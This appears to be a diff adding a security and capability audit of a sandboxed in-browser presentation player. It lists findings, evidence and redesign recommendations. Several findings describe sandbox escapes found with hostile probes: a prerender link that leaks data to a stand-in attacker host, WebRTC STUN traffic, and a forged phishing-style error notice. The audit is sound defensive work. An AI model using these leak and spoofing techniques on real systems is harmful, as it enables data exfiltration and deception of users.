@@ -1,0 +1,168 @@
+
+####################################################################################################
+##### A1-audit-player
+
+SUMMARY:
+The player accepts exactly one thing: a `qft-presentation.json` v1 manifest (engine must be "slidev") plus one self-contained HTML. Standard Reveal.js ZIPs, ordinary Slidev dist ZIPs and Slidev source are refused, or misrouted to the Markdown importer; nothing is editable.
+
+The blockers are mostly incidental. A hand-inlined Reveal.js 6.0.2 deck plays unmodified in 376 ms, so the sandbox is already engine-agnostic. What blocks the goal is the manifest gate, the single-HTML rule, the blob: document URL (breaks routers and fragment links), fatal-on-any-error, and an immutable package model.
+
+Security, tested with ~75 hostile probes in Chromium 158:
+- **Editor isolation holds.** No probe reached drafts, storage, DOM, top navigation, popups or dialogs.
+- **"No network" does not hold.** A script-inserted `<link rel=prerender>` makes a real HTTP GET to any URL, and WebRTC sends STUN packets. Neither raises a CSP violation, and no CSP variant I tried stops the prerender request.
+- **Error reporting is advisory.** The package can read its nonce and token, mute violation reports, and forge host messages.
+- **Infinite loops** are survivable on desktop Chromium (Stop in 43 ms) but freeze the editor where sandboxed frames share a process.
+
+Two findings matter most for the redesign:
+- A same-origin service worker cannot serve an opaque sandboxed frame, and runner-created blob URLs fail in the child. Blobs posted into the child and turned into blob URLs there work for images, CSS, classic scripts, ES modules, fetch, import() and workers.
+- In full Chromium (headed too), arrow keys do not reach the deck after Start until the user clicks; a small repair is verified.
+
+Only Chromium was available; Firefox and Safari behaviour is inferred or unknown.
+
+FINDINGS (24):
+
+[F1] (critical; verified-empirically) Only one input class plays: a ZIP with a qft-presentation.json v1 manifest whose engine is exactly "slidev" plus one self-contained HTML entry. A standard multi-file Reveal.js ZIP and an ordinary slidev-build dist ZIP are both rejected with "This is a website build ZIP. Follow tools/slidev/README.md and use the QFT Slidev packaging tool to bundle its scripts, fonts, and assets for local playback."; Slidev source gets "This ZIP contains Slidev source, not a playable presentation. ..."; engine "reveal" gets "This presentation package version is not supported. Use the current Slidev packaging tool."
+   EVIDENCE: 38 inputs fed through the real Open file control of the production build with Playwright (exp1-capability.cjs, exp1b-capability-extra.cjs); exact toast/notice text recorded. Code path: markdown-workspace.ts:1372-1386 -> presentation-library.ts:225-257 -> presentation-package.ts:308-331 (manifest gate :317-331, engine check :258-260).
+   SOURCES: src/lib/presentation-package.ts:308-331 | src/lib/presentation-package.ts:258 | prototypes/A1/logs/exp1-capability.json
+
+[F2] (critical; verified-empirically) The player is already engine-agnostic. A Reveal.js 6.0.2 deck inlined by plain text substitution (link -> style, script src -> inline; 817,864 B HTML) and labelled engine "slidev" plays in 376 ms with arrows, fragments, internal slide links, overview, canvas animation and button handlers working. The gap for goal (a) is import and linking, not the sandbox.
+   EVIDENCE: exp7-reveal.cjs in full Chromium 158: status "Playing locally"; indices 0/0 -> f=0 -> 1/0; counter 2; 45 canvas frames; Present (host fullscreen) keeps the same frame and slide. Reveal 6.0.2 themes embed fonts as data: URIs (0 @import in dist/theme/black.css).
+   SOURCES: prototypes/A1/logs/exp7-reveal.json | src/lib/presentation-runtime.ts:221-295
+
+[F3] (critical; verified-empirically) Isolation of the editor's data and UI holds against a hostile package. Blocked: native localStorage, IndexedDB (qft-markdown), cookies, Cache Storage, top/parent DOM, top navigation, popups, form submission, downloads, modal dialogs, fullscreen, pointer lock, fetch/XHR/beacon/WebSocket/EventSource, external img/CSS/font/prefetch/preload, external script even with the correct nonce, workers, nested frames, eval/Function/WASM, and own-frame navigation to http(s).
+   EVIDENCE: One package ran ~75 probes inside the player (exp2-battery.cjs, hostile-battery.html), repeated in full Chromium (exp2b) and in the standalone export from file:// (exp14). The attacker HTTP server received nothing for these probes; the host saw no dialogs, popups, downloads or top-level navigations; the draft stayed intact. Navigating the runner frame threw SecurityError in Chromium, although the HTML Standard's allowed-to-navigate algorithm would permit a non-top ancestor.
+   SOURCES: prototypes/A1/logs/exp2-battery.json | prototypes/A1/logs/exp2-battery-fullchromium.json | https://html.spec.whatwg.org/multipage/browsing-the-web.html#allowed-to-navigate
+
+[F4] (high; verified-empirically) The package can reach the network despite the CSP: a script-inserted <link rel="prerender" href="http://attacker/?leak=..."> causes a real HTTP GET to an arbitrary URL. The host keeps showing "Playing locally" and no CSP violation event fires. No declarative control stops it in Chromium 158.
+   EVIDENCE: exp15-prerender.cjs (hosted player, ordinary prepared document, full Chromium): attacker server logged GET /prerender?leak=SECRET-speculative%20loading%20probe with Sec-Purpose: prefetch, Sec-Fetch-Dest: document, no cookies. Reproduced in a headed window (exp18) and in the file:// export (exp14). exp15b: default-src 'none' as meta or header, frame-src/child-src 'none' and header sandbox all still fetch; prefetch-src and navigate-to are "Unrecognized Content-Security-Policy directive". Not seen in chrome-headless-shell, which is what CI uses. Static <link> elements are removed by the preparer; only dynamic insertion leaks.
+   SOURCES: prototypes/A1/logs/exp15-prerender.json | prototypes/A1/logs/exp15b-prerender-mitigation.json | prototypes/A1/logs/exp18-headed.json
+
+[F5] (high; verified-empirically) WebRTC also leaves the sandbox: RTCPeerConnection with an attacker STUN server sends UDP packets from inside the player. The CSP webrtc directive that would block it is not implemented in Chromium 158, Firefox or WebKit. This contradicts the UI text "No uploads. Playback has no external connections." and the README claim of no access to network services.
+   EVIDENCE: UDP listener received 8 STUN Binding Requests (20 bytes, 0001 0000 2112a442...) on 127.0.0.1 and 192.0.2.2 in headless shell, full Chromium and the export (exp2, exp2b, exp14). exp4: with webrtc 'block' Chromium logs "Unrecognized Content-Security-Policy directive 'webrtc'." and still sends. Mozilla bug 1783489 and WebKit bug 255651 are both NEW.
+   SOURCES: prototypes/A1/logs/exp4-webrtc.json | https://bugzilla.mozilla.org/show_bug.cgi?id=1783489 | https://bugs.webkit.org/show_bug.cgi?id=255651 | src/scripts/presentation-library.ts:140 | README.md:135-137
+
+[F6] (high; verified-empirically) Any uncaught error, unhandled promise rejection, element error event or CSP violation destroys the running presentation and resets it to the start card. Ordinary Reveal.js shortcuts trigger it: F kills with "Disallowed by permissions policy", S kills with "Uncaught TypeError: Cannot set properties of null (setting 'marked')". One corrupt inline image, a web-font @import, or a data-src lazy image is also fatal.
+   EVIDENCE: exp5-kills.cjs timelines: late error killed at ~1.05 s; click handler null.x killed; broken data: image killed at 220 ms with "A presentation resource could not be loaded..."; @import gives "...unsupported resource (style-src-elem)...". exp7 and exp7d for the Reveal keys. Code: presentation-runtime.ts:127-134 (bootstrap) and :237-245, :283 (host fail removes the frame).
+   SOURCES: src/lib/presentation-runtime.ts:127-134 | prototypes/A1/logs/exp5-kills.txt | prototypes/A1/logs/exp7d-fkey.json
+
+[F7] (high; verified-empirically) In full Chromium 158 (headless and headed) the keyboard does not reach the deck after Start or Present: arrow keys do nothing until the user clicks the slide, although the UI says "Use the slide controls or arrow keys". CI does not see it because it runs chrome-headless-shell and clicks inside the deck first. A small repair works: after ready, blur() then focus() the outer iframe, then send the existing qft-presentation-focus message.
+   EVIDENCE: exp7b: top activeElement is the iframe but runner and deck report hasFocus false; ArrowRight leaves the slide unchanged for both Reveal and the shipped Slidev example; console "Permissions policy violation: focus-without-user-activation is not allowed in this document." from presentation-sandbox.html. exp7c: after blur+focus the runner has focus; after the focus message the deck has focus and ArrowRight advances. exp18 confirms in a headed window under Xvfb. Causes: presentation-runtime.ts:72, :273, :289-292.
+   SOURCES: prototypes/A1/logs/exp7b-focus.json | prototypes/A1/logs/exp7c-focusfix.json | src/lib/presentation-runtime.ts:72 | tests/browser/presentations.mjs:57
+
+[F8] (high; verified-empirically) The blob: document URL is itself a blocker for ordinary decks. Fragment navigation is refused (<a href="#x">, location.hash, location.replace('#x') -> "Not allowed to load local resource: blob:null/...#x"), path pushState/replaceState throws SecurityError, and relative URLs cannot resolve. An ordinary Slidev 53.1.0 build (default history router) dies at start even after its modules are bundled into one HTML.
+   EVIDENCE: exp3 (http and https): hash stays empty for anchor click, location.hash, location.href and location.replace; replaceState/pushState with a fragment work. exp8: packed ordinary dist fails at 578 ms with SecurityError on replaceState (origin 'null', URL blob:null/...) then "Failed to execute 'replace' on 'Location': '' is not a valid URL." Reveal with history:true silently loses its hash writes (exp7).
+   SOURCES: prototypes/A1/logs/exp3-env.json | prototypes/A1/logs/exp8-packed-ordinary.json
+
+[F9] (high; verified-empirically) For a multi-file virtual file system inside the current sandbox, a same-origin service worker cannot serve an opaque-origin sandboxed iframe, and blob: URLs created by the runner cannot be loaded by the child. Blobs sent to the child with postMessage and turned into blob: URLs there work for images, stylesheets, classic scripts, ES modules with rewritten specifiers, fetch(), import() and Workers, with only blob: added to the CSP.
+   EVIDENCE: exp9: with a controlling SW, sandbox="allow-scripts" bypassed the SW and got the server's 404, while no-sandbox and allow-same-origin frames were served but ran with the site origin and readable storage. exp17: every runner-created blob URL failed in the child ("Not allowed to load local resource"). exp17b: all eight load types succeeded from child-created URLs in 33 ms, same frame topology, CSP = current policy plus blob: in script-src, style-src, font-src, connect-src and worker-src. Chromium only.
+   SOURCES: prototypes/A1/logs/exp9-platform.json | prototypes/A1/logs/exp17-blobvfs.json | prototypes/A1/logs/exp17b-blobvfs-child.json
+
+[F10] (high; verified-empirically) An infinite loop in a package does not freeze the editor on desktop Chromium: runner and deck are out-of-process frames, Stop works in 43 ms and the 20 s readiness timeout fires at 20,143 ms. Where sandboxed frames share the editor's process the whole tab freezes, Stop cannot be pressed and the timeout never fires.
+   EVIDENCE: exp6-freeze.cjs: full Chromium shows CDP targets for both iframes and 4 renderers, host rAF 0 ms, Stop clicked after 43 ms. chrome-headless-shell (single renderer): page.evaluate and rAF unanswered for 4 s, Stop click times out; with --site-per-process it recovers. Chromium docs: desktop isolates sandboxed frames since 127.0.6483.0, Android only with partial site isolation. Firefox bug 961689 "Process-isolated sandboxed iframes" is NEW, so a freeze there is inferred, not tested.
+   SOURCES: prototypes/A1/logs/exp6-freeze-chrome.json | prototypes/A1/logs/exp6-freeze-shell.json | https://raw.githubusercontent.com/chromium/chromium/main/docs/process_model_and_site_isolation.md | https://bugzilla.mozilla.org/show_bug.cgi?id=961689
+
+[F11] (high; verified-empirically) Standard ZIPs are silently misrouted. A Reveal.js project that also contains a README.md opens the README as a Markdown lesson ("Lesson opened..."); a ZIP with only a Slidev slides.md opens as raw Markdown with front matter; a Markdown ZIP containing slides.md and any .vue file is refused as Slidev source; a ZIP with both Slidev source and dist is called source-only; the library's own picker calls any non-presentation ZIP "a Markdown lesson ZIP".
+   EVIDENCE: exp1, exp1b, exp11. Cause: the website-build branch requires that no .md file exists (presentation-package.ts:325-327), otherwise it returns null and the workspace falls through to importWorkspaceBundle (markdown-workspace.ts:1377-1384); sourceOnly heuristic at :291-301; picker text at presentation-library.ts:71.
+   SOURCES: src/lib/presentation-package.ts:291-330 | src/scripts/markdown-workspace.ts:1377-1384 | src/scripts/presentation-library.ts:71
+
+[F12] (high; verified-primary-source) Editing is blocked by the data model, not only by the UI. The Source tab is a readonly textarea, the package object is immutable, the original ZIP Blob is the only persisted artifact, the store has no update operation, the player closes over one HTML string, the entry HTML is never shown as source, and Restart always begins at slide 1.
+   EVIDENCE: PresentationLibrary.astro:52 (readonly) and :53 (note that compiled slides do not change); presentation-package.ts:34-41 and :362; presentation-store.ts:130-189 (list/save/get/delete only); presentation-runtime.ts:221. Empirical check in exp11: typing leaves the textarea unchanged and presentation.html is shown as "This binary or large file is preserved in the ZIP...". CodeMirror 6 with lang-html/css/javascript is already in node_modules.
+   SOURCES: src/components/PresentationLibrary.astro:52-53 | src/lib/presentation-store.ts:130-189 | src/lib/presentation-package.ts:34-41
+
+[F13] (medium; verified-empirically) The host's fail-closed reporting is advisory. The package can read its script nonce and message token, mute securitypolicyviolation events, replace itself with a bootstrap-free blob: document and forge ready, and forge an error whose 350-character text appears in the editor's own notice bar.
+   EVIDENCE: exp2: the whole battery ran from a self-navigated blob document with a forged ready while the host showed "Playing locally". exp5 forged-error-text: notice shows "Your session expired. To restore your drafts, sign in again at https://qft-login.example/restore" (screenshot shots/exp5-forged-error-text.png). Token is a literal in the bootstrap script (presentation-runtime.ts:197); the runner's frame-src blob: permits self-navigation (:87).
+   SOURCES: src/lib/presentation-runtime.ts:87 | src/lib/presentation-runtime.ts:197 | prototypes/A1/shots/exp5-forged-error-text.png
+
+[F14] (medium; verified-empirically) "No dynamic code evaluation" is not a security boundary: eval and new Function are blocked, but an inline script created with the copied nonce runs. WebAssembly is blocked in the sandbox, in the editor document and in blob workers (editor CSP script-src 'self' has no 'wasm-unsafe-eval'), but allowed in a same-origin network worker. crossOriginIsolated is false and SharedArrayBuffer is undefined.
+   EVIDENCE: exp2: eval and Function throw EvalError; nonce'd inline script returns 42; WebAssembly.instantiate throws CompileError. exp9 on the real editor page: wasmMain BLOCKED, wasmBlobWorker BLOCKED, wasmNetworkWorker OK, service worker registration OK. Chromium only; other engines untested.
+   SOURCES: prototypes/A1/logs/exp9-platform.json | src/layouts/BaseLayout.astro:20-32
+
+[F15] (medium; verified-empirically) Unplayable packages are accepted, saved to IndexedDB and listed, and fail only when Start is pressed, because the playability checks run in start() rather than at import.
+   EVIDENCE: exp1: manifest packages whose entry has script src, CDN links, a relative img or an iframe each showed "Saved in this browser..." and created the qft-presentations database, then gave "This presentation has separate JavaScript files...", "...references an asset outside its HTML..." or "Embedded websites are not supported..." in 23-36 ms after Start. Code: prepare called at presentation-runtime.ts:252; import checks only <html and <body (presentation-package.ts:350).
+   SOURCES: src/lib/presentation-runtime.ts:164-190 | src/lib/presentation-runtime.ts:252 | src/lib/presentation-package.ts:350
+
+[F16] (medium; verified-empirically) Common interaction patterns of AI-written decks fail silently in the player: JS-handled forms never receive submit, alert/confirm/prompt are ignored, inline onclick attributes are stripped, external links lose href and target, and srcset is deleted.
+   EVIDENCE: exp5: js-form-submit-handler stays "not submitted" (console: blocked form submission, allow-forms not set); alert-then-update gives "answer=null"; inline-onclick-attribute stays "not clicked"; external link href/target null; srcset image naturalWidth 0. Code: sandbox="allow-scripts" only (presentation-runtime.ts:65, :258); attribute stripping :180; link href removal :187.
+   SOURCES: src/lib/presentation-runtime.ts:180-187 | prototypes/A1/logs/exp5-kills.json
+
+[F17] (medium; verified-empirically) The prepared document does not reproduce the deck faithfully. It injects box-sizing:border-box on everything, overflow:hidden and margin 0 on html/body and a body font; removes title and the deck's viewport meta; forces standards mode; moves head content into body. rootAttributes drops all body attributes if any value contains '>', never keeps id, and can take a <body> string from a script in head.
+   EVIDENCE: exp5 box-sizing case: a width:200px;padding:50px box measures 200 px instead of 300, and scrollHeight equals innerHeight. exp16: bodyClass, bodyId and bodyStyle come back empty for <body id="app" class="deck [&>p]:mt-2 wide" style=...>; document.title is empty; a head script string '<body class="from-a-js-string">' replaces the real body class. Code: presentation-runtime.ts:177, :201-210, :212.
+   SOURCES: src/lib/presentation-runtime.ts:201-212 | prototypes/A1/logs/exp16-fidelity.json
+
+[F18] (medium; verified-empirically) The repo's packer (tools/slidev/pack.mjs) cannot convert ordinary outputs. On an ordinary Slidev dist it stops at the default theme's Google Fonts link; on a classic multi-file Reveal project it exits 0 but emits a package that fails with "Uncaught ReferenceError: Reveal is not defined".
+   EVIDENCE: node pack.mjs --dist slidev-ordinary/dist gives "Slidev packaging failed: External asset cannot be packaged: https://fonts.googleapis.com/css2?... Bundle it during the Slidev build." for base / and base ./. With that one link removed it packs in 0.6 s (2.18 MB HTML) but playback fails on the history router. For Reveal, esbuild bundles each UMD script as a module so the globals are never set (pack.mjs:113-153).
+   SOURCES: tools/slidev/pack.mjs:81 | tools/slidev/pack.mjs:113-153 | prototypes/A1/logs/exp8-packed-ordinary.json
+
+[F19] (medium; verified-empirically) Limits: ZIP 60 MiB, expanded 120 MiB, entry HTML 24 MiB, any file 40 MiB, 1,000 entries, manifest 32 KiB, source preview 2 MiB per file and 8 MiB total, ready timeout 20 s, error text 350 chars. At the 24 MiB HTML limit, import takes 2.1 s and Start takes 1.8 s, all synchronous on the main thread. Because assets must be base64-inlined, the HTML cap allows roughly 18 MB of real media.
+   EVIDENCE: Constants at presentation-package.ts:5-14 with enforcement lines listed in the notes; presentation-runtime.ts:159, :216, :270-272. exp10-perf.cjs in full Chromium: 1 MiB 259/251 ms, 8 MiB 841/675 ms, 20 MiB 1,691/1,375 ms, 24 MiB 2,089/1,761 ms (import/start); 24 MiB + 1 byte gives "The playable HTML file exceeds 24 MB." in 118 ms. The 18 MB figure is derived from the 1.33x base64 growth.
+   SOURCES: src/lib/presentation-package.ts:5-14 | prototypes/A1/logs/exp10-perf.json
+
+[F20] (medium; verified-empirically) A failure while presenting in fullscreen is invisible: the notice and status elements are outside the fullscreen element, so the presenter only sees the start card again.
+   EVIDENCE: exp11: stillFullscreen true, notice text "Uncaught Error: late failure while presenting" exists but noticeInsideFullscreenElement is false; stage text is the start card only. Screenshot shots/exp11-error-in-fullscreen.png. Markup: notice at PresentationLibrary.astro:14, stage at :38, status at :48.
+   SOURCES: src/components/PresentationLibrary.astro:14 | prototypes/A1/shots/exp11-error-in-fullscreen.png
+
+[F21] (medium; verified-empirically) The HTML preparation step is a compatibility linter, not an enforcement layer. Content inside <template shadowrootmode="open"> is never inspected and becomes a live shadow root with external img, onerror, iframe, stylesheet link and target=_blank link intact; <style> text is not inspected. Only the CSP stops these. The classic noscript parsing differential does not apply.
+   EVIDENCE: exp5 declarative-shadow-dom: shadowRoot true, img src http://localhost:4401/dsd.png, onerror attribute present, iframe and link present; CSP violations script-src-attr, style-src-elem, img-src, frame-src; attacker server received nothing. exp5 mxss-noscript: no smuggled element. Code: querySelectorAll('*') on the template content at presentation-runtime.ts:178.
+   SOURCES: src/lib/presentation-runtime.ts:158-192 | prototypes/A1/logs/exp5-kills.json
+
+[F22] (low; verified-empirically) A postMessage flood from the package (about 130,000 messages per second) degrades but does not lock the editor in full Chromium: host timers fire a median 1.2 s late and a pointer click on Stop removes the frame after about 3.7 s. The host listener has no rate limit.
+   EVIDENCE: exp13: 361,839 messages in 2.8 s, host frame time 0 -> 99 ms, automation-level Stop click times out. exp13b: raw pointer click dispatched in 605 ms, frame removed 3,692 ms after the click, timer lateness median 1,201 ms, max 2,521 ms. Listener: presentation-runtime.ts:275-285.
+   SOURCES: prototypes/A1/logs/exp13b-flood-input.json | src/lib/presentation-runtime.ts:275-285
+
+[F23] (low; verified-empirically) Library defects: no de-duplication (the same ZIP, the example button and the documented deep link ?presentation=slidev-example each add another record), deck pushState pollutes the tab's history (host history.length 2 -> 7 after 5 pushes), and one record failing validateInfo makes the whole list reject.
+   EVIDENCE: exp11: sameZipTwice 2 rows, example twice +2 rows, deep link twice 2 rows of 1.6 MB each. exp5 history-entries. The all-or-nothing list is from code only: presentation-store.ts:84-97 and :130-139 (engine !== 'slidev' is a hard failure).
+   SOURCES: src/lib/presentation-store.ts:84-158 | prototypes/A1/logs/exp11-ux.json
+
+[F24] (low; verified-primary-source) The repo's CI cannot detect the focus bug, the prerender request or the process-model behaviour, because its browser test launches chrome-headless-shell (single renderer, no NoStatePrefetch) and clicks inside the deck before pressing keys. The architecture and verification docs do not describe the player at all.
+   EVIDENCE: tests/browser/presentations.mjs:119 uses chromium.launch({ headless: true }) and :57 clicks a heading before key presses; .github/workflows/check.yml:48-51. Behaviour differences between the two Chromium builds were measured in exp6, exp7b and exp2 vs exp2b. grep for "slidev" in docs/ returns nothing.
+   SOURCES: tests/browser/presentations.mjs:57 | tests/browser/presentations.mjs:119 | .github/workflows/check.yml:48-51
+
+RECOMMENDATIONS (9):
+
+[R1] (effort S; impact high) Keep the double opaque-origin sandbox and typed message protocol; reword the network promise
+   WHY: Every probe against editor data failed, so the runner -> blob child structure, the editor CSP and the archive validator are worth keeping as the base for any redesign. The network block is a privacy default, not a guarantee: prerender and WebRTC get out in Chromium 158 and no declarative control exists. UI and README text should say that decks cannot read drafts, rather than that playback has no external connections.
+   RISKS: If the product needs a hard no-network guarantee against hostile decks, iframe sandbox plus CSP cannot deliver it in Chromium today.
+
+[R2] (effort M; impact high) Open the import gate: classify archives and make the manifest optional
+   WHY: The manifest requirement and the engine constant are the first thing that rejects every standard Reveal.js or Slidev ZIP, and the fall-through sends some of them to the Markdown importer. Returning an archive kind instead of throwing at presentation-package.ts:323 and :328, synthesising a manifest (entry = shallowest index.html, engine detected from content) and widening the engine type in package, store and schema removes that blocker and the misleading messages.
+   RISKS: Heuristic detection can misclassify; the store's validateInfo must change in the same release or old records and new records will not list together.
+
+[R3] (effort M; impact high) Add an in-editor linker for classic multi-file sites as the first Reveal.js step
+   WHY: Text inlining of stylesheets and classic scripts plus data: URIs for assets yields a single HTML that the existing player runs unchanged (818 KB Reveal deck, 376 ms). It needs no runtime or CSP change and reuses the existing export. The repo packer is not suitable because it bundles UMD scripts as modules.
+   RISKS: The 24 MiB HTML cap with 1.33x base64 growth limits media; ES modules, run-time relative URLs and CDN references are not covered; Reveal F/S keys and lazy data-src still need the error-policy and shim work.
+
+[R4] (effort L; impact high) Build the virtual file system by transferring Blobs into the child and creating blob: URLs there
+   WHY: This is the only route found that keeps the opaque sandbox: service workers cannot reach it and runner-created blob URLs fail, while child-created ones work for images, CSS, classic and module scripts, fetch, import() and workers. It needs blob: added to the two policies, a loader document, reference rewriting, and shims for history, fragment links and relative fetches. It is the prerequisite for ordinary Slidev dist output and large media.
+   RISKS: Verified in Chromium only. Module specifier rewriting and router emulation for Slidev are the hard parts; the blob: URL limits remain and must be shimmed.
+
+[R5] (effort M; impact high) Make runtime errors non-fatal by default and move supervision into the runner
+   WHY: Killing the deck on any error breaks mainstream decks (Reveal F and S keys, one bad image, a web-font import) and is trivially evaded by a hostile package anyway. Report errors in an overlay and keep the frame. Let the runner count child load events to detect a deck replacing its document, add a message-rate limit, and prefix deck-supplied text in the host notice. Show failures inside the fullscreen element.
+   RISKS: A misbehaving deck keeps running until the user stops it; the navigation watchdog leaves a window of a few milliseconds.
+
+[R6] (effort S; impact high) Fix the keyboard focus hand-off and run the browser test in full Chromium
+   WHY: Arrow keys do nothing after Start or Present in real Chromium, which is the first thing a presenter tries. The repair is three lines: blur() then focus() the outer iframe after ready, then send the existing focus message. Running tests/browser/presentations.mjs with channel 'chromium' and without the pre-click would have caught it.
+   RISKS: Confirmed in headless and headed Chromium under Playwright's emulated window focus; a manual check on a physical desktop is still advisable.
+
+[R7] (effort S; impact medium) Grant low-risk capabilities and stop altering the deck's document
+   WHY: allow-forms with form-action 'none' kept restores JS forms; consider allow-modals, fullscreen delegation and clipboard-write. Drop the injected box-sizing rule, keep title, body id and viewport, and replace the rootAttributes regex with parsed attributes. None of these crosses the origin boundary, and each removes a silent failure seen in testing.
+   RISKS: allow-modals lets a deck block the tab with dialogs; fullscreen delegation lets a deck enter fullscreen on a user gesture.
+
+[R8] (effort L; impact high) Introduce an editable project model on top of the existing store and player
+   WHY: Editing needs a project object with a file map, an update operation in the store (database version 2, optionally an edits overlay so autosave does not rewrite a 60 MiB ZIP), a player update(html) method and slide-position hand-over across restarts. CodeMirror with HTML, CSS and JS modes is already installed. For Reveal.js and plain HTML decks the source is the playable artifact, so this delivers live editing without a compiler.
+   RISKS: Slidev source editing additionally needs an in-browser compile step, which is outside the player. WebAssembly tooling must run in a same-origin network worker or the editor CSP needs 'wasm-unsafe-eval'.
+
+[R9] (effort S; impact medium) Validate playability at import and de-duplicate saved packages
+   WHY: Running the inert prepare step before saving turns four save-then-fail cases into immediate, actionable messages. A content hash stops the library growing by 1.6 MB on every example click or deep-link visit.
+   RISKS: Prepare at import adds parse time for large packages (under 2 s at the 24 MiB limit).
+
+OPEN QUESTIONS:
+ - Firefox and Safari were not available: do the prerender request, the WebRTC packets, the focus hand-off bug, the fragment-navigation block and the child-created blob URL file system behave the same there?
+ - The HTML Standard lets a sandboxed frame navigate a non-top ancestor; Chromium blocks it. Do other engines allow the deck to navigate the runner frame (the editor's frame-src 'self' would limit it to same-origin URLs)?
+ - Does Chrome's user setting "Preload pages: off" suppress the <link rel=prerender> request, and do preconnect and dns-prefetch leak? Playwright starts Chromium with --disable-background-networking, so these could not be observed.
+ - Is WebAssembly in a same-origin network worker also allowed under the editor's meta CSP in Firefox and Safari, or must 'wasm-unsafe-eval' be added?
+ - Does a tab hidden during loading cause a false "has not finished loading" error? The ready signal needs two animation frames; headless Chromium keeps pages visible, so this is inferred from code only.
+ - How does the player behave on Android Chrome and Firefox when a deck loops forever? Same-process sandboxed frames are documented or inferred there, but not tested.
+ - Is a hard no-network guarantee a product requirement, or is "decks cannot read your drafts" enough? The answer decides whether CDN-based decks may be allowed to load their libraries.
+ - Memory exhaustion by a package was not tested because the machine is shared.
+
+ARTIFACTS: notes/A1-audit-player.md | prototypes/A1/lib.cjs | prototypes/A1/hostile-battery.html | prototypes/A1/exp1-capability.cjs | prototypes/A1/exp2-battery.cjs | prototypes/A1/exp5-kills.cjs | prototypes/A1/exp6-freeze.cjs | prototypes/A1/exp7-reveal.cjs | prototypes/A1/exp7c-focusfix.cjs | prototypes/A1/exp9-platform.cjs | prototypes/A1/exp15-prerender.cjs | prototypes/A1/exp17b-blobvfs-child.cjs | prototypes/A1/exp18-headed.cjs | prototypes/A1/pkgs/reveal-inlined.zip | prototypes/A1/logs | prototypes/A1/shots/exp5-forged-error-text.png | prototypes/A1/shots/exp11-error-in-fullscreen.png
